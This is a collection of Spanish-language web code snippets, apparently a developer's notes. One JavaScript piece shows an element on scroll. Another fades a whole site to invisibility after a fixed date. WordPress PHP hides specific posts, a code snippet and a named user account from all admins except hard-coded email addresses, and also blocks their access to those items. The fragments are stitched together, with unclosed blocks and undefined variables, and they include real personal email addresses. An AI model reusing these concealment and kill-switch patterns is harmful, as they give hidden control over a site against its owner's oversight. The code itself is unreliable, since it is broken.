Igual que el de abajo pero para varias secciones: Ocultar y mostrar un elemento en zonas espeficicas de una web (mientras sean visibles las "secciones" se mostrara el elemento)

    estilos para el elemento a ocultar: display: none; transition: opacity 1.5s; opacity: 0;


    <script type="text/javascript">

    document.addEventListener('scroll', function() {
        const secciones = document.querySelectorAll('.efecto-brillo'); // Selecciona todas las secciones con la clase en cuestion
        let isAnyVisible = false; // Variable para verificar si alguna sección es visible

        secciones.forEach(seccion => {
            const rect = seccion.getBoundingClientRect();
            const isVisible = rect.top < window.innerHeight && rect.bottom > 0; // Verifica si la sección está visible

            if (isVisible) {
                isAnyVisible = true; // Marca que al menos una sección es visible
            }
        });

        const elemento = document.getElementById('efecto'); // Selecciona el efecto

        if (isAnyVisible) {
            //console.log('Es visile'); // Mensaje en consola
            if (elemento.style.display === 'none' || elemento.style.display === '') {
                elemento.style.display = 'block'; // Muestra el elemento
                setTimeout(() => {
                    elemento.style.opacity = '1'; // Cambia la opacidad para la transición
                }, 10); // Pequeño retraso para permitir que el display se aplique
            }
        } else {
            //console.log('No es visile'); // Mensaje en consola
            if (elemento.style.display === 'block') {
                elemento.style.opacity = '0'; // Cambia la opacidad para ocultar
                setTimeout(() => {
                    elemento.style.display = 'none'; // Oculta el elemento después de la transición
                    console.log('Elemento ocultado'); // Mensaje en consola
                }, 1500); // Espera 1.5 segundos antes de ocultar
            }
        }
    });

    </script>

        const fechaLimite = new Date('2024-11-17');
        const hoy = new Date();
        const diasRestantes = Math.ceil((fechaLimite - hoy) / (1000 * 60 * 60 * 24));

        if (diasRestantes <= 0) {
            // Si la fecha límite ha pasado, ocultar el contenido
            document.body.style.opacity = 0;
            mostrarMensaje();
        } else if (diasRestantes <= 5) {
            // Si quedan 5 días o menos, reducir la opacidad
            const nuevaOpacidad = 1 - (0.2 * (5 - diasRestantes));
            document.body.style.opacity = nuevaOpacidad;

            if (nuevaOpacidad <= 0) {
                mostrarMensaje();
            }
        }

 * excepto para usuarios permitidos por email.

    /** =========================
     *  CONFIG
         *  ========================= */
        function hub_allowed_emails() {
            return [
                'abdielreyef@gmail.com',
                'diferentecreativo@gmail.com',
            ];
        }

        function hub_is_allowed_user_by_email($user_id = null) {
            $allowed = array_map(
                fn($e) => strtolower(trim($e)),
                hub_allowed_emails()
            );

            if ($user_id) {
                $user = get_user_by('id', $user_id);
            } else {
                $user = wp_get_current_user();
            }

            if (!$user || empty($user->user_email)) return false;

            return in_array(strtolower(trim($user->user_email)), $allowed, true);
        }

        function hub_protected_post_ids() {
            // ✅ Agregué 2613 como pediste
            return [1555, 330, 2613];
        }

        function hub_hidden_wpcode_ids() {
            // ✅ El snippet de WPCode que termina en 46
            return [3146];
        }

        /** =========================
         *  1) Ocultar posts/páginas protegidos del listado admin (edit.php)
         *  ========================= */
        add_action('pre_get_posts', function ($query) {
            if (!is_admin() || !$query->is_main_query()) return;

            global $pagenow;
            if ($pagenow !== 'edit.php') return;

            if (hub_is_allowed_user_by_email()) return;

            $protected = hub_protected_post_ids();

            $not_in = (array) $query->get('post__not_in');
            $not_in = array_merge($not_in, $protected);

            $query->set('post__not_in', array_values(array_unique($not_in)));
        });

        /** =========================
         *  2) Bloquear acceso directo por URL a editar/ver/borrar posts/páginas protegidos
         *  ========================= */
        add_action('admin_init', function () {
            if (hub_is_allowed_user_by_email()) return;

            $protected = hub_protected_post_ids();

            $post_id = 0;
            if (isset($_GET['post']))    $post_id = (int) $_GET['post'];
            if (isset($_POST['post_ID'])) $post_id = (int) $_POST['post_ID'];

            if ($post_id && in_array($post_id, $protected, true)) {
                wp_die(__('No tienes permisos para acceder a este contenido.', 'textdomain'), 403);
            }
        });

        /** =========================
         *  3) Bloquear capacidades (editar/borrar/ver) sobre posts/páginas protegidos
         *  ========================= */
        add_filter('map_meta_cap', function ($caps, $cap, $user_id, $args) {

            $protected = hub_protected_post_ids();

            $block_caps = [
                'edit_post',
                'delete_post',
                'read_post',
                'edit_page',
                'delete_page',
                'read_page',
            ];

            if (!in_array($cap, $block_caps, true)) return $caps;

            $post_id = isset($args[0]) ? (int) $args[0] : 0;
            if (!$post_id || !in_array($post_id, $protected, true)) return $caps;

            // Permitidos: normal
            if (hub_is_allowed_user_by_email($user_id)) return $caps;

            // No permitidos: bloqueado
            return ['do_not_allow'];

        }, 10, 4);

        /** =========================
         *  4) Quitar acciones (Editar, Duplicar, etc.) en filas protegidas si llegaran a mostrarse
         *  (normalmente ni aparecerán porque ya se ocultan, pero es capa extra)
         *  ========================= */
        function hub_strip_row_actions($actions, $post) {
            if (hub_is_allowed_user_by_email()) return $actions;

            if (in_array((int)$post->ID, hub_protected_post_ids(), true)) {
                $actions = []; // quita TODO
            }
            return $actions;

        add_action('admin_head', function () {

            $hide_ids_json = wp_json_encode($hide_ids);

                function hideRows(){
                  // En tu captura el número está en: <td class="column-id">3146</td>
                  document.querySelectorAll('tbody#the-list tr').forEach(tr => {
                    const td = tr.querySelector('td.column-id');
                    if (!td) return;

                    const idText = (td.textContent || '').trim();
                    const idNum = parseInt(idText, 10);

                    if (HIDE_IDS.includes(idNum)) {
                      tr.style.display = 'none';
                    }
                  });
                }

                if (document.readyState === 'loading') {

        // Solo aplica en el área de administración y en la lista de usuarios
        if (!is_admin() || !current_user_can('list_users')) {

        // Si el usuario actual NO está en la lista de correos autorizados
        if (!in_array($current_user->user_email, $allowed_emails)) {
            // Excluye al usuario con email "angelazael1996@gmail.com"
            $usuario_a_ocultar = get_user_by('email', 'angelazael1996@gmail.com');
            if ($usuario_a_ocultar) {
                $query->set('exclude', [$usuario_a_ocultar->ID]);
            }
        }
    }
